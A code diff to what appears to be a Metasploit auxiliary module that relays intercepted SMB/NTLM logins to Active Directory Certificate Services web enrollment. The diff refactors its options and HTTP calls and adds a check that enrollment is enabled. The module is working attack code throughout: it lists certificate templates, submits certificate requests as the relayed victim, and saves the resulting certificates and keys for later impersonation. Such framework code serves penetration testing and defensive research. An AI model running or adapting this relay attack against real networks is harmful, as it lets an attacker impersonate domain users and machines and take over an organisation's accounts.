@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
   include ::Msf::Exploit::Remote::SMB::RelayServer
+  include ::Msf::Exploit::Remote::HttpClient
 
   def initialize
     super({
@@ -29,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptEnum.new('MODE', [ true, 'The issue mode.', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
         OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
-        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ])
+        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/certsrv/' ])
       ]
     )
 
@@ -39,27 +40,62 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
-    deregister_options(
-      'RPORT', 'RHOSTS', 'SMBPass', 'SMBUser', 'CommandShellCleanupCommand', 'AutoVerifySession'
-    )
+    deregister_options('RHOSTS')
   end
 
   def relay_targets
     Msf::Exploit::Remote::SMB::Relay::TargetList.new(
-      :http,
-      80,
+      (datastore['SSL'] ? :https : :http),
+      datastore['RPORT'],
       datastore['RELAY_TARGETS'],
-      '/certsrv/', # TODO: this needs to be pulled from the datastore
+      datastore['TARGETURI'],
       randomize_targets: datastore['RANDOMIZE_TARGETS']
     )
   end
 
-  def run
+  def initial_handshake?(target_ip)
+    res = send_request_raw(
+      {
+        'rhost' => target_ip,
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri),
+        'headers' => {
+          'Accept-Encoding' => 'identity'
+        }
+      }
+    )
+    disconnect
+
+    res&.code == 401
+  end
+
+  def check_options
     if datastore['RHOSTS'].present?
       print_warning('Warning: RHOSTS datastore value has been set which is not supported by this module. Please verify RELAY_TARGETS is set correctly.')
     end
 
+    case datastore['MODE']
+    when 'SPECIFIC_TEMPLATE'
+      if datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
+        fail_with(Failure::BadConfig, 'CERT_TEMPLATE must be set in AUTO and SPECIFIC_TEMPLATE mode')
+      end
+    when 'ALL', 'AUTO', 'QUERY_ONLY'
+      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
+        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
+      end
+    end
+  end
+
+  def run
+    check_options
     @issued_certs = {}
+    relay_targets.each do |target|
+      vprint_status("Checking endpoint on #{target}")
+      unless initial_handshake?(target.ip)
+        fail_with(Failure::UnexpectedReply, "Web Enrollment does not appear to be enabled on #{target}")
+      end
+    end
+
     start_service
     print_status('Server started.')
 
@@ -84,7 +120,9 @@ class MetasploitModule < Msf::Auxiliary
       cert_template = datastore['CERT_TEMPLATE']
       retrieve_cert(relay_connection, relay_identity, cert_template)
     end
+
     vprint_status('Relay tasks complete; waiting for next login attempt.')
+    relay_connection.disconnect!
   end
 
   def create_csr(private_key, cert_template)
@@ -102,13 +140,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_cert_templates(relay_connection)
     print_status('Retrieving available template list, this may take a few minutes')
-    req = relay_connection.request_raw(
+    res = send_request_raw(
       {
+        'client' => relay_connection,
         'method' => 'GET',
-        'uri' => normalize_uri(datastore['CERT_URI'], 'certrqxt.asp')
+        'uri' => normalize_uri(target_uri, 'certrqxt.asp')
       }
     )
-    res = relay_connection.send_recv(req, relay_connection.timeout, true)
     return nil unless res&.code == 200
 
     cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
@@ -145,10 +183,11 @@ class MetasploitModule < Msf::Auxiliary
     request = create_csr(private_key, cert_template)
     cert_template_string = "CertificateTemplate:#{cert_template}"
     vprint_status('Requesting relay target generate certificate...')
-    req = relay_connection.request_cgi(
+    res = send_request_raw(
       {
+        'client' => relay_connection,
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['CERT_URI'], 'certfnsh.asp'),
+        'uri' => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
         'ctype' => 'application/x-www-form-urlencoded',
         'vars_post' => {
           'Mode' => 'newreq',
@@ -157,10 +196,10 @@ class MetasploitModule < Msf::Auxiliary
           'TargetStoreFlags' => 0,
           'SaveCert' => 'yes',
           'ThumbPrint' => ''
-        }
+        },
+        'cgi' => true
       }
     )
-    res = relay_connection.send_recv(req, relay_connection.timeout, true)
     if res&.code == 200 && !res.body.include?('request was denied')
       print_good("Certificate generated using template #{cert_template} and #{relay_identity}")
       add_cert_entry(relay_identity, cert_template)
@@ -170,15 +209,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     location_tag = res.body.match(/^.*location="(.*)"/)[1]
-    location_uri = normalize_uri(datastore['CERT_URI'], location_tag)
+    location_uri = normalize_uri(target_uri, location_tag)
     vprint_status("Attempting to download the certificate from #{location_uri}")
-    req = relay_connection.request_cgi(
+    res = send_request_raw(
       {
+        'client' => relay_connection,
         'method' => 'GET',
         'uri' => location_uri
       }
     )
-    res = relay_connection.send_recv(req, relay_connection.timeout, true)
     info = "#{relay_identity} Certificate"
     certificate = OpenSSL::X509::Certificate.new(res.body)
     pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
@@ -190,18 +229,5 @@ class MetasploitModule < Msf::Auxiliary
                              info)
     print_good("Certificate for #{relay_identity} using template #{cert_template} saved to #{stored_path}")
     certificate
-  end
-
-  def normalize_uri(*strs)
-    new_str = strs * '/'
-
-    new_str = new_str.gsub!('//', '/') while new_str.index('//')
-
-    # Makes sure there's a starting slash
-    unless new_str[0, 1] == '/'
-      new_str = '/' + new_str
-    end
-
-    new_str
   end
 end
